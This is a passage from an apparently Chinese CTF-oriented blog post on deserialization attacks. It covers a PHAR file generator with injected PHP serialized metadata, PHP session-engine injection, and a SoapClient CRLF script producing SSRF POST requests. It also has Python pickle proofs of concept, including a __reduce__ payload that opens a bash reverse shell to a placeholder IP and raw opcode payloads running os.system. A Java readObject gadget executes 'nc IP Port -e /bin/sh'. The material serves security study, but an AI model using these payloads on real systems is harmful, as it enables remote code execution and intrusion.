pack(<span class="string">&quot;I&quot;</span>, <span class="built_in">len</span>(file[<span class="string">&quot;fileContent&quot;</span>]))</span><br><span class="line">            <span class="comment"># 时间戳</span></span><br><span class="line">            files += pack(<span class="string">&quot;I&quot;</span>, <span class="built_in">int</span>(time()))</span><br><span class="line">            <span class="comment"># 压缩后大小</span></span><br><span class="line">            files += pack(<span class="string">&quot;I&quot;</span>, <span class="built_in">len</span>(file[<span class="string">&quot;fileContent&quot;</span>]))</span><br><span class="line">            <span class="comment"># CRC32校验</span></span><br><span class="line">            files += pack(<span class="string">&quot;I&quot;</span>, crc32(file[<span class="string">&quot;fileContent&quot;</span>]))</span><br><span class="line">            <span class="comment"># 文件权限</span></span><br><span class="line">            files += pack(<span class="string">&quot;I&quot;</span>, <span class="number">0o666</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 如果将序列化内容存储于此</span></span><br><span class="line">            <span class="keyword">if</span> file[<span class="string">&quot;loc&quot;</span>]:</span><br><span class="line">                <span class="comment"># metadata长度</span></span><br><span class="line">                files += pack(<span class="string">&quot;I&quot;</span>, <span class="built_in">len</span>(file[<span class="string">&quot;metaData&quot;</span>]))</span><br><span class="line">                <span class="comment"># metadata内容</span></span><br><span class="line">                files += file[<span class="string">&quot;metaData&quot;</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                files += pack(<span class="string">&quot;I&quot;</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> files</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">content</span>(<span class="params">self</span>):</span><br><span class="line"></span><br><span class="line">        contents = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 遍历所有归档文件</span></span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> self.filesData:</span><br><span class="line">            contents += file[<span class="string">&quot;fileContent&quot;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> contents</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">signature</span>(<span class="params">self, content</span>):</span><br><span class="line"></span><br><span class="line">        signature = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 签名内容</span></span><br><span class="line">        <span class="keyword">if</span> self.signatureType == self.MD5:</span><br><span class="line">            signature = md5(content).digest()</span><br><span class="line">        <span class="keyword">if</span> self.signatureType == self.SHA1:</span><br><span class="line">            signature = sha1(content).digest()</span><br><span class="line">        <span class="keyword">if</span> self.signatureType == self.SHA256:</span><br><span class="line">            signature = sha256(content).digest()</span><br><span class="line">        <span class="keyword">if</span> self.signatureType == self.SHA512:</span><br><span class="line">            signature = sha512(content).digest()</span><br><span class="line">        <span class="comment"># 签名标志</span></span><br><span class="line">        signature += self.signatureType</span><br><span class="line">        <span class="comment"># GBMB标志</span></span><br><span class="line">        signature += self.GBMB</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> signature</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pharData = &#123;</span><br><span class="line">        <span class="string">&quot;prefix&quot;</span>: <span class="string">&quot;123&quot;</span>,</span><br><span class="line">        <span class="string">&quot;manifestData&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;loc&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">            <span class="string">&quot;metaData&quot;</span>: <span class="string">&quot;&quot;&quot;O:1:&quot;e&quot;:1:&#123;s:1:&quot;a&quot;;s:4:&quot;text&quot;;&#125;&quot;&quot;&quot;</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;filesData&quot;</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;fileName&quot;</span>: <span class="string">&quot;e.txt&quot;</span>,</span><br><span class="line">                <span class="string">&quot;fileContent&quot;</span>: <span class="string">&quot;dsadawada&quot;</span>,</span><br><span class="line">                <span class="string">&quot;loc&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">                <span class="string">&quot;metaData&quot;</span>: <span class="string">&quot;&quot;&quot;O:1:&quot;e&quot;:1:&#123;s:1:&quot;a&quot;;s:4:&quot;text&quot;;&#125;&quot;&quot;&quot;</span>,</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;fileName&quot;</span>: <span class="string">&quot;c.txt&quot;</span>,</span><br><span class="line">                <span class="string">&quot;fileContent&quot;</span>: <span class="string">&quot;123&quot;</span>,</span><br><span class="line">                <span class="string">&quot;loc&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">                <span class="string">&quot;metaData&quot;</span>: <span class="string">&quot;&quot;&quot;O:1:&quot;e&quot;:1:&#123;s:1:&quot;a&quot;;s:4:&quot;text&quot;;&#125;&quot;&quot;&quot;</span>,</span><br><span class="line">            &#125;,</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">&quot;signatureType&quot;</span>: PHAR.SHA1,</span><br><span class="line">    &#125;</span><br><span class="line">    p = PHAR(**pharData).generate()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;a.phar&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(p)</span><br></pre></td></tr></table></figure></li></ul><p>​</p><h3 id="PHP-session反序列化"><a href="#PHP-session反序列化" class="headerlink" title="PHP session反序列化"></a>PHP session反序列化</h3><p>PHP中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项 <strong>session.save_handler</strong> 来进行确定的，默认是以文件的方式存储。存储的文件是以sess_[sessionid]来进行命名的。</p><p>有三种方式：</p><ul><li><p>默认使用php：键名|键值（经过序列化函数处理的值）</p><p><code>name|s:6:&quot;1FonlY&quot;;</code></p></li><li><p><strong>php_serialize</strong>：经过序列化函数处理的值</p><p><code>a:1:&#123;s:4:&quot;name&quot;;s:6:&quot;1FonlY&quot;;&#125;</code></p></li><li><p><strong>php_binary</strong>：键名的长度对应的ASCII字符 + 键名 + 经过序列化函数处理的值</p><p><code>names:6:&quot;1FonlY&quot;;</code></p><p>不可显的为<code>EOT</code> ,<code>name</code>的长度为<code>4</code> 4在ASCII 表中就是 EOT</p></li></ul><p><strong>当序列化的引擎和反序列化的引擎不一致时，就可以利用引擎之间的差异产生序列化注入漏洞。</strong></p><p>比如这里先实例化一个对象，然后将其序列化为 <code>O:7:&quot;_1FonlY&quot;:1:&#123;s:3:&quot;cmd&quot;;N;&#125;</code>，</p><p>如果传入 <code>|O:7:&quot;_1FonlY&quot;:1:&#123;s:3:&quot;cmd&quot;;N;&#125;</code>，在使用<code>php_serialize</code> 引擎的时候，</p><p>序列化后的session 文件是这样的 <code>a:1:&#123;s:4:&quot;name&quot;;s:31:&quot;|O:7:&quot;_1FonlY&quot;:1:&#123;s:3:&quot;cmd&quot;;N;&#125;&quot;;&#125;</code>，</p><p>这时，将<code>a:1:&#123;s:4:&quot;name&quot;;s:31:&quot;</code> 当做键名，<code>O:7:&quot;_1FonlY&quot;:1:&#123;s:3:&quot;cmd&quot;;N;&#125;</code> 当做键值，将键值进行反序列化输出，这时就造成了序列化注入攻击。</p><p>​</p><h3 id="Soap反序列化"><a href="#Soap反序列化" class="headerlink" title="Soap反序列化"></a>Soap反序列化</h3><p><code>SOAP</code> : <code>Simple Object Access Protocol</code>简单对象访问协议。</p><p>采用HTTP作为底层通讯协议，XML作为数据传送的格式，正常情况下的<code>SoapClient</code>类，调用一个不存在的函数，会去调用<code>__call</code>方法。</p><p><strong>CRLF漏洞</strong></p><p><code>SOAPAction</code>处可控，可以把<code>\x0d\x0a</code>注入到<code>SOAPAction</code>，POST请求的header就可以被控制。</p><p>但<code>Content-Type</code>在<code>SOAPAction</code>的上面，就无法控制<code>Content-Type</code>，也就不能控制POST的数据。</p><p>在header里<code>User-Agent</code>在<code>Content-Type</code>前面，<code>user_agent</code>同样可以注入<code>CRLF</code>，控制<code>Content-Type</code>的值。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://127.0.0.1:5555/path&#x27;</span>;</span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;data=something&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: PHPSESSID=my_session&#x27;</span></span><br><span class="line">    );</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;^^Content-Length: &#x27;</span>.(<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_string</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_string</span>,<span class="string">&#x27;uri&#x27;</span>=&gt; <span class="string">&quot;aaab&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="comment">//$aaa = str_replace(&#x27;&amp;&#x27;,&#x27;&amp;&#x27;,$aaa);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$aaa</span>;</span><br><span class="line"><span class="comment">//echo urlencode($aaa);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//$c = unserialize($aaa);</span></span><br><span class="line"><span class="comment">//$c-&gt;not_exists_function();</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>如上，使用SoapClient反序列化+CRLF<strong>可以生成任意POST请求</strong>。</p><p><strong><code>Deserialization + __call + SoapClient + CRLF = SSRF</code></strong></p><p>​</p><h3 id="python反序列化"><a href="#python反序列化" class="headerlink" title="python反序列化"></a>python反序列化</h3><p>与PHP类似，python也有序列化功能以长期储存内存中的数据。pickle是python下的序列化与反序列化包。</p><p>python有另一个更原始的序列化包marshal，现在开发时一般使用pickle。</p><p>与json相比，pickle以二进制储存，不易人工阅读；json可以跨语言，而pickle是Python专用的；pickle能表示python几乎所有的类型（包括自定义类型），json只能表示一部分内置类型且不能表示自定义类型。</p><p>pickle实际上可以看作一种<strong>独立的语言</strong>，通过对opcode的更改编写可以执行python代码、覆盖变量等操作。直接编写的opcode灵活性比使用pickle序列化生成的代码更高，有的代码不能通过pickle序列化得到（pickle解析能力大于pickle生成能力）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># poc</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/[IP]/[Port] 0&gt;&amp;1\&quot;&#x27;)&quot;</span>,))</span><br><span class="line">poc = A()</span><br><span class="line">result = pickle.dumps(poc)</span><br><span class="line">result = base64.b64encode(result)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p><strong>RCE</strong></p><p><strong>R</strong>指令：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;&#x27;&#x27;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>i</strong>指令：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">ios</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>o</strong>指令：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>工具</strong></p><p>更方便的opcode生成工具： <a target="_blank" rel="noopener" href="https://github.com/eddieivan01/pker">EddieIvan01/pker</a></p><p>参考：</p><p><a target="_blank" rel="noopener" href="https://www.f4de.ink/pages/20ac5e/#pickle%EF%BC%9Apython%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E5%BA%93">Python-Pickle反序列化安全问题</a></p><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7436">pickle反序列化初探</a></p><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html">Code-Breaking中的两个Python沙箱</a></p><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/DEADF1SH-CAT/p/12465346.html">pickle反序列化—高校抗“疫”网络安全分享赛</a></p><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/89132768">从零开始python反序列化攻击：pickle原理解析 &amp; 不用reduce的RCE姿势</a></p><p><a target="_blank" rel="noopener" href="https://ucasers.cn/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B8%8E%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">Python反序列化漏洞与沙箱逃逸</a></p><p><a target="_blank" rel="noopener" href="https://goodapple.top/archives/1069">Pickle反序列化</a></p><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/361349643">pickle反序列化的利用技巧总结</a></p><p>​</p><h3 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h3><p>Java序列化是指把Java对象转换为字节序列的过程，<code>ObjectOutputStream</code> 类的 <code>writeObject()</code> 方法可以实现序列化。</p><p>Java反序列化是指把字节序列恢复为Java对象的过程，<code>ObjectOutputStream</code> 类的 <code>readObject()</code> 方法用于反序列化。</p><p>一个类要能反序列化必须满足下面2个条件：</p><ol><li>该类必须实现 <code>java.io.Serializable</code> 接口；</li><li>该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String username)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.username = username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="built_in">this</span>.username);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.ctfshow.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserPayload</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">userDataPost</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;nc IP Port -e /bin/sh&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">            os.writeObject(user);</span><br><span class="line">            os.close();</span><br><span class="line">            <span class="type">byte</span>[] userData = byteArrayOutputStream.toByteArray();</span><br><span class="line">            userDataPost = <span class="keyword">new</span> <span class="title class_">String</span>(Base64.getEncoder().encode(userData));</span><br><span class="line">            System.out.println(userDataPost);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>绕过</strong></p><ul><li><p>readUnshared()</p><p>readUnshared()不允许后续的readObject和readUnshared调用引用这次调用反序列化得到的对象，而readObject读取的对象可以。</p></li></ul><p>​</p><h3 id="JDBC反序列化"><a href="#JDBC反序列化" class="headerlink" title="JDBC反序列化"></a>JDBC反序列化</h3><p><a target="_blank" rel="noopener" href="https://github.com/codeplutos/MySQL-JDBC-Deserialization-Payload">MySQL客户端jdbc反序列化漏洞</a></p><p>​</p><h3 id="框架反序列化（CVE）"><a href="#框架反序列化（CVE）" class="headerlink" title="框架反序列化（CVE）"></a>框架反序列化（CVE）</h3><ul><li><h5 id="Yii2"><a href="#Yii2" class="headerlink" title="Yii2"></a>Yii2</h5><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8307">CVE-2020-15148 Yii2反序列化RCE POP链分析</a></p><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/217930">我是如何挖掘yii2反序列化0day的</a></p></li><li><h5 id="Laravel"><a href="#Laravel" class="headerlink" title="Laravel"></a>Laravel</h5><ul><li><p>v5.8</p><p><a target="_blank" rel="noopener" href="https://www.bbsmax.com/A/ZOJPvDnldv/">Laravel 5.8 RCE 分析</a></p></li></ul></li><li><h5 id="ThinkPHP"><a href="#ThinkPHP" class="headerlink" title="ThinkPHP"></a>ThinkPHP</h5><ul><li><p>v5.1.x</p><p><a target="_blank" rel="noopener" href="https://nikoeurus.github.io/2019/12/31/ThinkPHP%205.1.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">ThinkPHP 5.1.x反序列化</a></p></li></ul></li></ul><h3 id="PHPGGC"><a href="#PHPGGC" class="headerlink" title="PHPGGC"></a>PHPGGC</h3><p>PHPGGC是一款能够自动生成主流框架的序列化测试payload的工具。</p><p><a target="_blank" rel="noopener" href="https://github.com/ambionics/phpggc">PHPGGC: PHP Generic Gadget Chains</a></p><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5450">从0到1掌握反序列化工具之PHPGGC</a></p></div><div class="article-footer"></div></article><section id="comments"><div id="vcomments"></div></section></div><nav class="bar bar-footer clearfix" data-stick-bottom><div class="bar-inner"><ul class="pager pull-left"><li class="prev"><a href="/2020/05/16/web-SQL%E6%B3%A8%E5%85%A5/" title="SQL注入"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a></li><li class="next"><a href="/2020/05/15/web-RCE/" title="RCE"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a></li><li class="toggle-toc"><a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="文章目录" role="button"><span>[&nbsp;</span><span>文章目录</span> <i class="text-collapsed icon icon-anchor"></i> <i class="text-in icon icon-close"></i> <span>]</span></a></li></ul><button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>赏</span></button><div class="bar-right"><div class="share-component" data-sites="weibo,qq,wechat" data-mobile-sites="weibo,qq,wechat"></div></div></div></nav><div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog"><div class="modal-dialog" role="document"><div class="modal-content donate"><button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button><div class="modal-body"><div class="donate-box"><div class="donate-head"><p>这篇文章对你有用，赏一杯咖啡☕~~</p></div><div class="tab-content"><div role="tabpanel" class="tab-pane fade active in" id="wechatpay"><div class="donate-payimg"><img src="/images/donate/wechatpayimg.png" alt="扫码支持" title="扫一扫"></div><p class="text-muted mv">⎝Lazzaro⎠</p><p class="text-grey">打开微信扫一扫即可扫码打赏他一波哦~</p></div><div role="tabpanel" class="tab-pane fade" id="alipay"><div class="donate-payimg"><img src="/images/donate/alipayimg.png" alt="扫码支持" title="扫一扫"></div><p class="text-muted mv">⎝Lazzaro⎠</p><p class="text-grey">打开支付宝扫一扫即可扫码打赏他一波哦~</p></div></div><div class="donate-footer"><ul class="nav nav-tabs nav-justified" role="tablist"><li role="presentation" class="active"><a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="true"><i class="icon icon-wepay"></i> 微信支付</a></li><li role="presentation"><a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="false"><i class="icon icon-alipay"></i> 支付宝</a></li></ul></div></div></div></div></div></div></main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter"><ul class="social-links"><li><a href="https://github.com/Lazzzaro" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li></ul><div class="copyright">&copy; 2025 Lazzaro<br><span>总访问 - <span id="busuanzi_value_site_pv"></span>次</span><br><span>访客数 - <span id="busuanzi_value_site_uv"></span>人</span><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer><script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script><script>window.jQuery||document.write('<script src="js/jquery.min.js"><\/script>')</script><script src="/js/plugin.min.js"></script><script src="/js/application.js"></script><script>window.INSIGHT_CONFIG={TRANSLATION:{POSTS:"文章",PAGES:"页面",CATEGORIES:"类别",TAGS:"关键词",UNTITLED:"(未命名)"},ROOT_URL:"/",CONTENT_URL:"/content.json"}</script><script src="/js/insight.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//cdn.jsdelivr.net/npm/valine"></script><script type="text/javascript">var GUEST=["nick","mail","link"],meta=(meta="nick,mail,link").split(",").filter(function(e){return-1<GUEST.indexOf(e)});new Valine({el:"#vcomments",verify:!1,notify:!1,appId:"sK4BUsDgfSB843HYgJyTcV7P-gzGzoHsz",appKey:"NKNx8m2CtFeDofr8LNLX7aNG",placeholder:"来来来说点啥~~\r\n对你有用？赏一波！↘↘",avatar:"mp",meta:meta,pageSize:"10",visitor:!0})</script><script defer type="text/javascript">!function(e,a,t,n,g,c){e.GoogleAnalyticsObject=n,e.ga=e.ga||function(){(e.ga.q=e.ga.q||[]).push(arguments)},e.ga.l=+new Date,g=a.createElement(t),c=a.getElementsByTagName(t)[0],g.async=1,g.src="//www.google-analytics.com/analytics.js",c.parentNode.insertBefore(g,c)}(window,document,"script","ga"),ga("create","UA-165804489-1","auto"),ga("send","pageview")</script><style>.copy-btn{display:inline-block;padding:6px 12px;font-size:13px;font-weight:700;line-height:20px;color:#333;white-space:nowrap;vertical-align:middle;cursor:pointer;background-color:#eee;background-image:linear-gradient(#fcfcfc,#eee);border:1px solid #d5d5d5;border-radius:3px;user-select:none;outline:0}.highlight-wrap .copy-btn{transition:opacity .3s ease-in-out;opacity:0;padding:2px 6px;position:absolute;right:4px;top:8px;z-index:2}.highlight-wrap .copy-btn:focus,.highlight-wrap:hover .copy-btn{opacity:1}.highlight-wrap{position:relative}</style><script>addLoadEvent(()=>{$(".highlight").each(function(t,e){var n=$("<div>").addClass("highlight-wrap");$(e).after(n),n.append($("<button>").addClass("copy-btn").append("复制").on("click",function(t){var e=$(this).parent().find(".code")[0].innerText;e+="\n/**\n* 复制并使用代码请注明引用出处哦~\n* Lazzaro @ https://lazzzaro.github.io\n*/";var n=document.createElement("textarea");document.body.appendChild(n),n.style.position="absolute",n.style.top="0px",n.style.left="0px",n.value=e,n.select(),n.focus();e=document.execCommand("copy");document.body.removeChild(n),e?$(this).text("复制成功"):$(this).text("复制失败"),$(this).blur()})).on("mouseleave",function(t){var e=$(this).find(".copy-btn");setTimeout(function(){e.text("复制")},300)}).append(e)})})</script><script type="text/x-mathjax-config">MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });</script><script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script></body></html>